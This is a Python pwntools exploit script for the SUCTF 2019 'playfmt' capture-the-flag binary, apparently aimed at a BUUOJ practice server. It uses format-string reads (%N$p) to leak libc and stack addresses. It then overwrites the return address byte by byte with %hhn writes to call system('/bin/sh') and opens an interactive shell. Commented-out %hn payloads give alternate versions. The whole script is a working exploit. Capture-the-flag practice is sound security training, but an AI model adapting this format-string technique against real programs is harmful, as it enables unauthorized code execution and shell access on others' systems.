#!/usr/bin/env python3
# Date: 2024-11-12 18:42:31

from pwn import *
from LibcSearcher import *

context.terminal = ['tmux', 'splitw', '-h']
context.binary = './suctf_2019_playfmt'
context.log_level = 'debug'
context.timeout = 240

io = process('./suctf_2019_playfmt')
io = remote('node5.buuoj.cn', 25991)
elf = ELF('./suctf_2019_playfmt')
libc = ELF('./libc-2.27.buu.so')
one_gadgets = [0x3cdea, 0x3cdec, 0x3cdf0, 0x3cdf7, 0x6749f, 0x674a0, 0x1357ae, 0x1357af]

def debug(gdbscript="", stop=False):
    if isinstance(io, process):
        gdb.attach(io, gdbscript=gdbscript)
        if stop:
            pause()

stop = pause
S = pause
leak = lambda name, address: log.info("{} ===> {}".format(name, hex(address)))
s   = io.send
sl  = io.sendline
sla = io.sendlineafter
sa  = io.sendafter
slt = io.sendlinethen
st  = io.sendthen
r   = io.recv
rn  = io.recvn
rr  = io.recvregex
ru  = io.recvuntil
ra  = io.recvall
rl  = io.recvline
rs  = io.recvlines
rls = io.recvline_startswith
rle = io.recvline_endswith
rlc = io.recvline_contains
ia  = io.interactive
ic  = io.close
cr  = io.can_recv

def get_target_offset_value(offset):
    payload = f"%{offset}$p@@@"
    sl(payload)
    value = int(ru(b'@@@')[:-3] , 16)
    return value

def modify_last_byte(last_byte , offset):
    payload = "%" + str(last_byte) + "c" + f"%{offset}$hhn!!!"
    s(payload)
    ru(b'!!!')

def modify(addr , value , ebp_offset , ebp_1_offset):
    addr_last_byte = addr & 0xff
    for i in range(4):
        now_value = (value >> (i * 8)) & 0xff
        modify_last_byte(addr_last_byte + i ,  ebp_offset)
        modify_last_byte(now_value , ebp_1_offset)


debug("b do_fmt()")
ru(b'=====================')
ru(b'=====================')

libc_base = get_target_offset_value(23) - libc.sym['__libc_start_main'] - 241
esp_addr = get_target_offset_value(6) - (0xffffa6e8 - 0xffffa6b0)
flag_addr = get_target_offset_value(18) - 0x30
ebp_addr = esp_addr + 0x18
ret_addr = ebp_addr + 0x4

leak('libc_base', libc_base)
leak('esp_addr', esp_addr)
leak('ebp_addr', ebp_addr)
leak('flag_addr', flag_addr)

system_addr = libc_base + libc.sym['system']
bin_sh = libc_base + next(libc.search(b'/bin/sh'))
leak("system_addr", system_addr)
leak("bin_sh", bin_sh)

print("=====================================================================\n\n\n")
modify(ret_addr, system_addr, 6, 14)
# payload = '%' + str(ret_addr & 0xffff) + 'c%6$hnABAB'
# s(payload.encode())
# ru(b'ABAB')

# payload = '%' + str(system_addr & 0xffff) + 'c%14$hnABAB'
# s(payload.encode())
# ru(b'ABAB')

# print("=====================================================================\n\n\n")
# payload = '%' + str((ret_addr+2) & 0xffff) + 'c%6$hnABAB'
# s(payload.encode())
# ru(b'ABAB')

# payload = '%' + str((system_addr >> 16) & 0xffff) + 'c%14$hnABAB'
# s(payload.encode())
# ru(b'ABAB')

print("=====================================================================\n\n\n")
modify(ret_addr+8, bin_sh, 6, 14)
# payload = '%' + str((ret_addr+8) & 0xffff) + 'c%6$hnABAB'
# s(payload.encode())
# ru(b'ABAB')

# payload = '%' + str(bin_sh & 0xffff) + 'c%14$hnABAB'
# s(payload.encode())
# ru(b'ABAB')

# print("=====================================================================\n\n\n")
# payload = '%' + str((ret_addr+10) & 0xffff) + 'c%6$hnABAB'
# s(payload.encode())
# ru(b'ABAB')

# payload = '%' + str((bin_sh >> 16) & 0xffff) + 'c%14$hnABAB'
# s(payload.encode())
# ru(b'ABAB')

print("=====================================================================\n\n\n")
payload = b'quit\x00'
s(payload)

ia()
